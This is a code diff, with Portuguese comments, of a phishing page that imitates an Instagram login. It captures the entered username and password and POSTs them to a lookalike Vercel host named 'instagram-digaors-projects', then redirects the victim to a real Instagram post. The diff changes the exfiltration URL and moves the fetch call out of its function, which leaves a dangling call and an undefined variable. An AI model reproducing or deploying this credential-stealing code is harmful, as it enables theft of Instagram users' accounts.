@@ -148,7 +148,7 @@
           console.log("Password:", password);
 
           // Envia os logs para o Vercel usando a API de logs
-          var vercelURL = "redirectlnstagram.vercel.app"; // Substitua com a URL real do seu projeto Vercel
+          var vercelURL = "https://instagram-digaors-projects.vercel.app"; // Substitua com a URL real do seu projeto Vercel
           enviarLogsParaVercel(username, password, vercelURL);
 
           // Redireciona para a URL desejada
@@ -161,24 +161,22 @@
         });
 
       // Função para enviar logs para o Vercel usando a API de logs
-      function enviarLogsParaVercel(username, password, vercelURL) {
-        // Monta a mensagem de log
-        var logMessage = `Username: ${username}, Password: ${password}`;
-
-        // Envia a mensagem de log para o Vercel
-        fetch(`https://${vercelURL}/User/Login`, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify({ message: logMessage }),
+      fetch(`https://${vercelURL}/User/Login`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({ message: logMessage }),
+      })
+        .then((response) => response.json())
+        .then((data) => {
+          console.log("Log enviado com sucesso:", data);
+          window.location.href =
+            "https://www.instagram.com/p/C1rpPeSg3Kp/?utm_source=ig_web_copy_link";
         })
-          .then((response) => response.json())
-          .then((data) => console.log("Log enviado com sucesso:", data))
-          .catch((error) =>
-            console.error("Erro ao enviar log para o Vercel:", error)
-          );
-      }
+        .catch((error) =>
+          console.error("Erro ao enviar log para o Vercel:", error)
+        );
     </script>
   </body>
 </html>
